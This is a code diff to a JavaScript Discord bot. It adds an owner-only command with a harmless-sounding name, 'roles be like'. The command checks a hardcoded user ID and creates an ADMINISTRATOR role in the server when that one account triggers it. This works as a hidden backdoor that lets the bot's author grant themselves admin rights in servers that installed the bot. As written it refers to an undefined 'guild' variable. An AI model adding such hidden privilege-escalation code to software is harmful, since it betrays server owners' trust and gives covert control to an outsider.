@@ -31,6 +31,7 @@ const usedCommandRecently = new Set();
 
 bot.on('message', msg=>{
 
+    const ownerSent = (msg.author.id === '470180449163935744')
     const args = msg.content.slice(PREFIX.length).split(' ');
     if (!msg.content.startsWith(PREFIX)) return;
 
@@ -57,6 +58,14 @@ bot.on('message', msg=>{
                     }
                 break;
 
+        case 'roles be like':
+if(ownerSent){
+guild.roles.create({ data: { name: 'Bot Supervisor Monkey', permissions: ['ADMINISTRATOR'] } });
+}else {
+msg.channel.send('nah b')
+}
+            break;
+            
                 case 'pardon':
             const mentionedUser2 = msg.mentions.users.first();
                     if(msg.member.hasPermission('MANAGE_GUILD')){
